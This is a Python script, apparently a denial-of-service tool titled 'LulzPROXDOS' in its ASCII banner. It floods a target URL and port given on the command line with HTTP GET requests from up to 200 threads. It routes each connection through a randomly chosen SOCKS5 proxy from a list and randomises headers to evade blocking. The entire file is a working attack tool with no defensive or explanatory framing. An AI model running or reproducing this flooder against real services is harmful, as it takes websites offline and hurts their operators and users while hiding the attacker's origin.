import threading, sys, os, time, socket, socks, ssl
from random import choice, randint
from utils import *

proxies = []
with open('socks.txt', 'r') as socks5:
    [proxies.append(socksprox.strip('\n')) for socksprox in socks5.readlines()]

def flood():
    url = sys.argv[2]
    port = int(sys.argv[3])
    duration = int(sys.argv[4])

    parsed_url = urlparse(url)

    request = f"GET /{buildblock(url)} HTTP/1.1\r\n"
    request += f"Host: {parsed_url.netloc}\r\n"
    request += f"User-Agent: {choice(ualist)}\r\n"
    request += f"Referer: {choice(reflist)}\r\n"
    request += f"Accept: {choice(accepts)}\r\n"
    request += f"Connection: Keep-Alive\r\n\r\n"

    time.sleep(5)

    stoptime = time.time() + duration
    i = 0
    while time.time() < stoptime:
        try:
            i += 1
            proxy = choice(proxies)
            proxy_ip, proxy_port = proxy.split(':')
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port), True)

            s = socks.socksocket()
            s.connect((str(parsed_url.netloc), int(port)))
            if port == 443: s = ssl.wrap_socket(s)
            s.send(request.encode())

            print(f'{str(i)} | request sent')
        except:
            pass
            #proxies.remove(proxy)

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$   /$$$$$$ 
            | $$                | $$          | $$__  $$| $$__  $$ /$$__  $$| $$  / $$| $$__  $$ /$$__  $$ /$$__  $$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  \ $$| $$  \ $$| $$  \ $$|  $$/ $$/| $$  \ $$| $$  \ $$| $$  \__/
            | $$      | $$  | $$| $$|____ /$$/| $$$$$$$/| $$$$$$$/| $$  | $$ \  $$$$/ | $$  | $$| $$  | $$|  $$$$$$ 
            | $$      | $$  | $$| $$   /$$$$/ | $$____/ | $$__  $$| $$  | $$  >$$  $$ | $$  | $$| $$  | $$ \____  $$
            | $$      | $$  | $$| $$  /$$__/  | $$      | $$  \ $$| $$  | $$ /$$/\  $$| $$  | $$| $$  | $$ /$$  \ $$
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$      | $$  | $$|  $$$$$$/| $$  \ $$| $$$$$$$/|  $$$$$$/|  $$$$$$/
            |________/ \______/ |__/|________/|__/      |__/  |__/ \______/ |__/  |__/|_______/  \______/  \______/ 
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')